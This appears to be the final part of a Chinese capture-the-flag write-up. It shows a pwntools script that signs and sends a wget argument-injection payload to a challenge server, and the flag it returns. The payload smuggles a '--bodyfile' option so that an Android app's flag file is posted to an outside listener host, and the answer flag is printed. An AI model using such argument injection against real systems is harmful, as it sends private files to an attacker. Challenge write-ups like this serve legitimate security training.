</code></pre><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="xj0c"><ol class="linenums"><li class="L0"><code class="language-py"><span class="kwd">import</span><span class="pln"> hmac </span></code></li><li class="L1"><code class="language-py"><span class="kwd">from</span><span class="pln"> hashlib </span><span class="kwd">import</span><span class="pln"> sha1 </span></code></li><li class="L2"><code class="language-py"><span class="kwd">from</span><span class="pln"> pwn </span><span class="kwd">import</span><span class="pln"> </span><span class="pun">*</span></code></li><li class="L3"><code class="language-py"></code></li><li class="L4"><code class="language-py"><span class="kwd">def</span><span class="pln"> hmacsha1</span><span class="pun">(</span><span class="pln">k</span><span class="pun">,</span><span class="pln">s</span><span class="pun">):</span><span class="pln">    </span></code></li><li class="L5"><code class="language-py"><span class="pln">    hashed </span><span class="pun">=</span><span class="pln"> hmac</span><span class="pun">.</span><span class="pln">new</span><span class="pun">(</span><span class="pln">k</span><span class="pun">,</span><span class="pln"> s</span><span class="pun">,</span><span class="pln"> sha1</span><span class="pun">)</span><span class="pln">   </span></code></li><li class="L6"><code class="language-py"><span class="pln">    </span><span class="kwd">return</span><span class="pln"> hashed</span><span class="pun">.</span><span class="pln">hexdigest</span><span class="pun">()</span></code></li><li class="L7"><code class="language-py"></code></li><li class="L8"><code class="language-py"><span class="kwd">def</span><span class="pln"> send_p</span><span class="pun">(</span><span class="pln">s</span><span class="pun">,</span><span class="pln">k</span><span class="pun">):</span><span class="pln">    </span></code></li><li class="L9"><code class="language-py"><span class="pln">    message </span><span class="pun">=</span><span class="pln"> </span><span class="pun">{</span><span class="str">"message"</span><span class="pun">:</span><span class="pln">s</span><span class="pun">,</span><span class="str">"check"</span><span class="pun">:</span><span class="pln">hmacsha1</span><span class="pun">(</span><span class="pln">k</span><span class="pun">,</span><span class="pln">s</span><span class="pun">)}</span></code></li><li class="L0"><code class="language-py"><span class="pln">    </span><span class="kwd">return</span><span class="pln"> str</span><span class="pun">(</span><span class="pln">message</span><span class="pun">)</span><span class="pln">   </span></code></li><li class="L1"><code class="language-py"></code></li><li class="L2"><code class="language-py"><span class="pln">p </span><span class="pun">=</span><span class="pln"> remote</span><span class="pun">(</span><span class="str">'212.64.66.177'</span><span class="pun">,</span><span class="lit">8080</span><span class="pun">)</span><span class="pln"> </span></code></li><li class="L3"><code class="language-py"><span class="com"># p = remote('127.0.0.1',8080) </span></code></li><li class="L4"><code class="language-py"><span class="pln">k </span><span class="pun">=</span><span class="pln"> int</span><span class="pun">(</span><span class="pln">p</span><span class="pun">.</span><span class="pln">recvline</span><span class="pun">()[:-</span><span class="lit">1</span><span class="pun">])</span></code></li><li class="L5"><code class="language-py"><span class="pln">payload </span><span class="pun">=</span><span class="pln"> </span><span class="str">"66.42.44.232:23333 --bodyfile=/data/data/com.xuanxuan.getflag/files/flag --method=HTTPMethod"</span><span class="pln"> </span></code></li><li class="L6"><code class="language-py"><span class="pln">p</span><span class="pun">.</span><span class="pln">sendline</span><span class="pun">(</span><span class="pln">send_p</span><span class="pun">(</span><span class="pln">payload</span><span class="pun">,</span><span class="pln">str</span><span class="pun">(</span><span class="pln">k</span><span class="pun">)))</span></code></li><li class="L7"><code class="language-py"></code></li><li class="L8"><code class="language-py"><span class="pln">p</span><span class="pun">.</span><span class="pln">interactive</span><span class="pun">()</span></code></li></ol></pre><p data-anchor-id="tcg2">然后在服务器上监听相应端口，得到<code>XCTF{this_wget_is_from_termux_and_I_move_some_dynamic_lib_to_systemlib_to_run_it}</code></p></div>
</body>
</html>